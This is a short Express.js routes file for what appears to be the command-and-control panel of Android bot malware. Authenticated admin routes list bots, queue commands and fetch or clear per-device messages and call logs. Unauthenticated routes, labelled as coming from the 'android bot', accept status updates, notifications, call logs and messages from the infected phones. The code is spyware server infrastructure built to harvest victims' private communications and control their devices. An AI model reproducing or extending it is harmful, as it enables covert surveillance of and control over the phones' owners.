var ctrls = require('require-dir')('./controllers')
var path = require('path')
var auth = require('./middlewares/auth')

module.exports = function Routes(app, io) {

  var bots_ctrl = ctrls.bots_ctrl(io)
  var commands_ctrl = ctrls.commands_ctrl(io)
  var messages_ctrl = ctrls.messages_ctrl(io)
  var call_log_ctrl = ctrls.call_log_ctrl(io)
  var notifications_ctrl = ctrls.notifications_ctrl(io)

  // admin routes
  app.post('/login', auth)
  app.get('/pending-commands', commands_ctrl.pendingCommands)
  app.get('/bots', auth, bots_ctrl.index)
  app.get('/bots/:id', auth, bots_ctrl.show)
  app.post('/add-command', auth, commands_ctrl.addCommand)
  app.get('/get-commands', auth, commands_ctrl.getCommands)
  app.delete('/commands/:id', auth, commands_ctrl.delete)
  app.delete('/clear-messages/:uid', auth, messages_ctrl.clearMessages)
  app.get('/get-messages/:uid', auth, messages_ctrl.getMessages)
  app.get('/call-logs/:uid', auth, call_log_ctrl.showLogs)
  app.delete('/call-logs/:uid', auth, call_log_ctrl.clear)

  // routes from android bot
  app.post('/status/:uid', bots_ctrl.updateStatus)
  app.post('/notify', notifications_ctrl.notify)
  app.post('/call-logs', call_log_ctrl.create)
  app.post('/message', messages_ctrl.addMessage)

  // html5 push state
  app.get(/.*\.(html|js|css|map|jpg|png|gif)/, function(req, res, next) {
    res.status(404).send()
  })
  app.get('*', function(req, res, next) {
    res.sendFile(path.join(__dirname, 'panel', 'index.html'));
  })
}
